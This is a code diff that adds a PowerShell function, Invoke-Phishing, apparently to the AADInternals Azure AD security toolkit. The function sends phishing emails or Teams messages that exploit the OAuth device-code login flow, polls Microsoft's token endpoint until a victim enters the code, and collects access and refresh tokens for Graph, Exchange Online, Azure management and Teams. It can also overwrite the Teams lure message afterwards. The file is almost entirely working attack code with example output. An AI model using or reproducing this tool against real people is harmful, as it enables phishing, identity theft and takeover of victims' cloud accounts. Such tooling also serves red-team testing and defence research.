@@ -872,3 +872,285 @@ function Invoke-UserEnumerationAsInsider
     }
 }
 
+# Sends phishing email to given recipients
+# Oct 13th 2020
+function Invoke-Phishing
+{
+<#
+    .SYNOPSIS
+    Sends phishing mail to given recipients and receives user's access token
+
+    .DESCRIPTION
+    Sends phishing mail to given recipients and receives user's access token using device code authentication flow.
+
+    .Parameter Tenant
+    Tenant id of tenant used for authentication. Defaults to "Common"
+
+    .Parameter Tenant
+    Tenant id of tenant used for authentication. Defaults to "Common"
+
+    .Parameter Recipients
+    Comma separated list of recipient emails
+
+    .Parameter Subject
+    Subject of the email
+
+    .Parameter Sender
+    Sender of the email. Supports the plain email "user@example.com" and display name "Some User <user@example.com" formats 
+
+    .Parameter SMTPServer
+    Ip address or FQDN of the SMTP server used to send the email
+
+    .Parameter SMTPCredentials
+    Credentials used to authenticate to SMTP server
+
+    .Parameter Message
+    An html message to be sent to recipients. Uses string formatting to insert url and user code.
+    {0} = user code
+    {1} = signing url
+
+    Default message:
+    '<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
+
+    .Parameter CleanMessage
+    An html message used to replace the original Teams message after the access token has been received.
+
+    Default message:
+    '<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
+
+    .Parameter Teams
+    Switch indicating that Teams is used for sending phishing messages.
+
+    .Example
+    $tokens = Invoke-AADIntPhishing -Recipients svictim@company.com -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local 
+
+    Code: CKDZ2BURF
+    Mail sent to: wvictim@company.com
+    ...
+    Received access token for william.victim@company.com
+
+    .Example
+    $tokens = Invoke-AADIntPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -SaveToCache
+
+    Code: CKDZ2BURF
+    Mail sent to: wvictim@company.com
+    Mail sent to: wvictim2@company.com
+    ...
+    Received access token for william.victim@company.com
+
+    PS C:\>$results = Invoke-AADIntReconAsInsider
+
+    Tenant brand:                company.com
+    Tenant name:                 company.onmicrosoft.com
+    Tenant id:                   d4e225d6-8877-4bc6-b68c-52c44011ba81
+    Azure AD objects:            147960/300000
+    Domains:                     5 (5 verified)
+    Non-admin users restricted?  True
+    Users can register apps?     True
+    Directory access restricted? False
+    Directory sync enabled?      true
+    Global admins                10
+
+    .Example
+    PS C:\>Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
+
+    PS C:\>$tokens = Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams 
+    
+    ```
+    Code: CKDZ2BURF
+    Teams message sent to: wvictim@company.com. Message id: 132473151989090816
+    ...
+    Received access token for william.victim@company.com
+    
+#>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [String]$Tenant="Common",
+        [Parameter(Mandatory=$True)]
+        [String[]]$Recipients,
+        [Parameter(Mandatory=$False)]
+        [String]$Message='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>',
+
+        [Parameter(ParameterSetName='Teams',Mandatory=$True)]
+        [Switch]$Teams,
+        [Parameter(ParameterSetName='Teams',Mandatory=$False)]
+        [String]$CleanMessage='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>',
+
+        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
+        [String]$Subject,
+        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
+        [String]$Sender,
+        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
+        [String]$SMTPServer,
+        [Parameter(ParameterSetName='Mail',Mandatory=$False)]
+        [System.Management.Automation.PSCredential]$SMTPCredentials,
+
+        [Switch]$SaveToCache
+        
+    )
+    Begin
+    {
+        # Choises
+        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""#%&/()=?*+-_"
+    }
+    Process
+    {
+        if($Teams)
+        {
+            # Get access token from cache
+            $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+
+            # Get the list of tenants the user has access to
+            $tenants = Get-AzureTenants -AccessToken $AccessToken
+            $tenantNames = $tenants | select -ExpandProperty Name
+
+            # Prompt for tenant choice if more than one
+            if($tenantNames.count -gt 1)
+            {
+                $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
+                for($p=0; $p -lt $tenantNames.count; $p++)
+                {
+                    $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
+                }
+                $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
+                }
+            else
+            {
+                $opt=0
+            }
+            $tenantInfo = $tenants[$opt]
+            $tenant =     $tenantInfo.Id
+
+            # Create a new AccessToken for graph.microsoft.com
+            $refresh_token = $script:refresh_tokens["d3590ed6-52b3-4102-aeff-aad2292ab01c-https://management.core.windows.net"]
+            if([string]::IsNullOrEmpty($refresh_token))
+            {
+                throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
+            }
+            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId $tenant -RefreshToken $refresh_token -SaveToCache $true
+        }
+
+        # Create a body for the first request. We'll be using client id of "Microsoft Office"
+        $clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        $body=@{
+            "client_id" = $clientId
+            "resource" =  "https://graph.windows.net"
+        }
+
+        # Invoke the request to get device and user codes
+        $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$tenant/oauth2/devicecode?api-version=1.0" -Body $body
+
+        Write-Host "Code: $($authResponse.user_code)"
+        
+        # Format the message        
+        $message=[string]::Format($message,$authResponse.user_code,$authResponse.verification_url)
+        
+        # Send messages
+        $teamsMessages=@()
+        foreach($recipient in $Recipients)
+        {
+            if($Teams)
+            {
+                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html
+                Write-Host "Teams message sent to: $Recipients. Message id: $($msgDetails.MessageID)"
+                $msgDetails | Add-Member -NotePropertyName "Recipient" -NotePropertyValue $recipient
+                $teamsMessages += $msgDetails
+            }
+            else
+            {
+                Send-MailMessage -from $Sender -to $recipient -Subject $Subject -Body $message -SmtpServer $SMTPServer -BodyAsHtml -Encoding utf8
+                Write-Host "Mail sent to: $recipient"
+            }
+        }
+        
+
+        $continue = $true
+        $interval = $authResponse.interval
+        $expires =  $authResponse.expires_in
+
+        # Create body for authentication subsequent requests
+        $body=@{
+            "client_id" =  $ClientId
+            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+            "code" =       $authResponse.device_code
+            "resource" =   $Resource
+        }
+
+        # Loop while authorisation pending or until timeout exceeded
+        while($continue)
+        {
+            Start-Sleep -Seconds $interval
+            $total += $interval
+
+            if($total -gt $expires)
+            {
+                Write-Error "Timeout occurred"
+                return
+            }
+                        
+            # Try to get the response. Will give 400 while pending so we need to try&catch
+            try
+            {
+                $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
+            }
+            catch
+            {
+                # This normal flow, always returns 400 unless successful
+                $details=$_.ErrorDetails.Message | ConvertFrom-Json
+                $continue = $details.error -eq "authorization_pending"
+                Write-Verbose $details.error
+                Write-Host "." -NoNewline
+
+                if(!$continue)
+                {
+                    # Not pending so this is a real error
+                    Write-Error $details.error_description
+                    return
+                }
+            }
+
+            # If we got response, all okay!
+            if($response)
+            {
+                Write-Host "" # new line
+                break # Exit the loop
+            }
+        }
+
+        # Dump the name
+        $user = (Read-Accesstoken -AccessToken $response.access_token).upn
+        Write-Host "Received access token for $user"
+
+        # Clear the teams messages
+        foreach($msg in $teamsMessages)
+        {
+            Send-TeamsMessage -AccessToken $AccessToken -Recipients $msg.Recipient -MessageId $msg.MessageID -Message $CleanMessage -Html | Out-Null
+        }
+
+        # Save the tokens to cache
+        if($SaveToCache)
+        {
+            Write-Verbose "ACCESS TOKEN: SAVE TO CACHE"
+            $Script:tokens["$ClientId-https://graph.windows.net"] =         $response.access_token
+            $Script:refresh_tokens["$ClientId-https://graph.windows.net"] = $response.refresh_token
+        }
+        
+        # Create the return hashtable
+        $attributes = @{
+            "AADGraph" =         $response.access_token
+            "refresh_token" =    $response.refresh_token
+            "EXO" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office365.com"       -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+            "MSGraph" =          Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com"         -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+            "AZCoreManagement" = Get-AccessTokenWithRefreshToken -Resource "https://management.core.windows.net" -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+            "Teams" =            Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com"        -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
+        }
+
+        # Return
+        if(!$SaveToCache)
+        {
+            return New-Object psobject -Property $attributes
+        }
+        
+    }
+}
